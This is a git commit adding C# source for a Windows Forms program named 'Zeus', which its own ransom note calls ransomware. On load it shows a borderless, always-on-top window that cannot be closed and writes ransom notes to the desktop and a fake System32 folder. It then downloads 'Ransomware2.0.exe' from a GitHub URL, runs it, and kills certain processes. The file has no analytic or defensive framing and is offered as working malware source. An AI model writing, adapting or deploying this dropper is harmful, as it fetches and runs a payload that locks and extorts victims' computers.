424ecdf0a4ac8cfa4a68618c40a76700d40b91ca
akkaiba <74521113+akkaiba@users.noreply.github.com>
2021-02-18 11:13:56 +0100

    Add files via upload

---
+++ zeusStart/Zeus/Form1.Designer.cs
@@ -0,0 +1,58 @@
+﻿namespace Zeus
+{
+    partial class launcher
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(launcher));
+            this.SuspendLayout();
+            // 
+            // launcher
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(22, 22);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "launcher";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;
+            this.Text = "launcher";
+            this.TopMost = true;
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.launcher_FormClosing);
+            this.Load += new System.EventHandler(this.launcher_Load);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+    }
+}
+
---
+++ zeusStart/Zeus/Form1.cs
@@ -0,0 +1,83 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Zeus
+{
+    public partial class launcher : Form
+    {
+        public launcher()
+        {
+            InitializeComponent();
+            this.TransparencyKey = this.BackColor;
+        }
+
+        private void launcher_FormClosing(object sender, FormClosingEventArgs e)
+        {
+
+            e.Cancel = true;
+
+        }
+
+        private void launcher_Load(object sender, EventArgs e)
+        {
+
+            Directory.CreateDirectory("C:\\Program Files\\System32");
+            File.WriteAllText("C:\\Program Files\\System32\\README.txt", "You were encrypted by the Zeus ransomware by akkaiba....");
+
+            this.Left = 0;
+            this.Top = 0;
+            this.Width = Screen.PrimaryScreen.Bounds.Width;
+            this.Height = Screen.PrimaryScreen.Bounds.Height;
+
+            string path_cache = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            string existfile = path_cache + @"\._cache_DCQPKX.exe";
+            if (!File.Exists(existfile))
+            {
+                string pathcachefile = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
+                using (StreamWriter streamWriter = File.CreateText(pathcachefile + @"\._cache_DCQPKX.exe"))
+                {
+                    streamWriter.WriteLine("Your files have been locked!");
+                }
+            }
+
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            using (StreamWriter streamWriter = File.CreateText(path + @"\RANSOMWARE2.0.txt"))
+            {
+                streamWriter.WriteLine("Your files have been locked!");
+            }
+
+            ServicePointManager.Expect100Continue = true;
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+
+            WebClient webClient = new WebClient();
+            webClient.DownloadFile("https://github.com/akkaiba/zeus-ransomware-master/blob/main/Ransomware2.0.exe", @"C:\Program Files\System32\Ransomware2.0.exe");
+
+            Process.Start("C:\\Program Files\\System32\\Ransomware2.0.exe");
+
+            Process[] _process = null;
+            _process = Process.GetProcessesByName("DCQPKX");
+            foreach (Process proces in _process)
+            {
+                proces.Kill();
+            }
+
+            Process[] _process2 = null;
+            _process2 = Process.GetProcessesByName("._cache_DCQPKX");
+            foreach (Process proces2 in _process2)
+            {
+                proces2.Kill();
+            }
+        }
+    }
+}
